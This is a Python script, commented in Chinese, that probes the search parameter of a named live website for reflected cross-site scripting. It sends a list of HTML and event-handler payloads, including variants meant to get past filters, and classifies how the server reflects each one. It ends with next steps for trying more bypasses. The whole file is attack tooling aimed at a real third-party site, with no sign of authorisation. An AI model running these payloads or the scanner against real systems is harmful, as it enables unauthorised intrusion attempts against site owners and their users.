#!/usr/bin/env python3
"""
验证HTML注入是否真的可利用
目标：确认XSS是否可执行
"""
import requests
from urllib.parse import quote

BASE_URL = 'https://developer.konghq.com'

def verify_html_injection():
    """详细验证HTML注入"""
    
    print("="*80)
    print(" HTML注入深度验证")
    print("="*80)
    
    # 测试payloads - 从简单到复杂
    payloads = [
        # 基础反射测试
        ('<b>test</b>', '粗体标签'),
        ('<i>test</i>', '斜体标签'),
        
        # 图片标签（无事件）
        ('<img src=x>', '图片标签'),
        
        # 带事件的标签
        ('<img src=x onerror=alert(1)>', '图片+onerror'),
        ('<svg onload=alert(1)>', 'SVG+onload'),
        
        # 其他向量
        ('<details open ontoggle=alert(1)>', 'Details+ontoggle'),
        ('<marquee onstart=alert(1)>', 'Marquee+onstart'),
        
        # 绕过尝试
        ('<img src=x oNError=alert(1)>', '大小写混合'),
        ('<img src=x onerror  =  alert(1)>', '空格绕过'),
        ('<img/src=x onerror=alert(1)>', '斜杠代替空格'),
    ]
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0',
    })
    
    results = []
    
    for payload, desc in payloads:
        print(f"\n[测试] {desc}")
        print(f"  Payload: {payload}")
        
        try:
            url = f"{BASE_URL}/plugins/?q={quote(payload)}"
            resp = session.get(url, timeout=10)
            
            # 检查payload是否在响应中
            if payload in resp.text:
                print(f"  🔴 完整反射！")
                results.append((payload, desc, 'FULL_REFLECTION'))
            else:
                # 检查部分反射
                tag_name = payload.split()[0].strip('<')
                if f'<{tag_name}' in resp.text:
                    print(f"  ⚠️  标签存在，但属性可能被过滤")
                    
                    # 检查事件处理器
                    if 'onerror' in payload and 'onerror' not in resp.text.lower():
                        print(f"  ✅ onerror被过滤")
                        results.append((payload, desc, 'TAG_ONLY'))
                    elif 'onload' in payload and 'onload' not in resp.text.lower():
                        print(f"  ✅ onload被过滤")
                        results.append((payload, desc, 'TAG_ONLY'))
                    else:
                        print(f"  🔴 事件处理器可能存在")
                        results.append((payload, desc, 'POSSIBLE_XSS'))
                else:
                    print(f"  ✅ 完全过滤")
                    results.append((payload, desc, 'BLOCKED'))
                    
        except Exception as e:
            print(f"  ❌ 错误: {e}")
    
    # 总结
    print("\n" + "="*80)
    print(" 📊 验证结果")
    print("="*80)
    
    full_reflection = [r for r in results if r[2] == 'FULL_REFLECTION']
    tag_only = [r for r in results if r[2] == 'TAG_ONLY']
    possible_xss = [r for r in results if r[2] == 'POSSIBLE_XSS']
    blocked = [r for r in results if r[2] == 'BLOCKED']
    
    print(f"\n完整反射: {len(full_reflection)}")
    for payload, desc, _ in full_reflection:
        print(f"  • {desc}: {payload}")
    
    print(f"\n仅标签反射: {len(tag_only)}")
    for payload, desc, _ in tag_only:
        print(f"  • {desc}: {payload}")
    
    print(f"\n可能XSS: {len(possible_xss)}")
    for payload, desc, _ in possible_xss:
        print(f"  • {desc}: {payload}")
    
    print(f"\n被阻止: {len(blocked)}")
    
    if possible_xss or full_reflection:
        print("\n🔴🔴🔴 发现潜在的Stored XSS漏洞！")
        print("\n下一步:")
        print("  1. 在浏览器中手动测试这些payload")
        print("  2. 尝试更多绕过技巧")
        print("  3. 如果alert(1)能执行，就是可利用的XSS")
    else:
        print("\n✅ 所有事件处理器都被过滤，XSS不可利用")

if __name__ == '__main__':
    verify_html_injection()
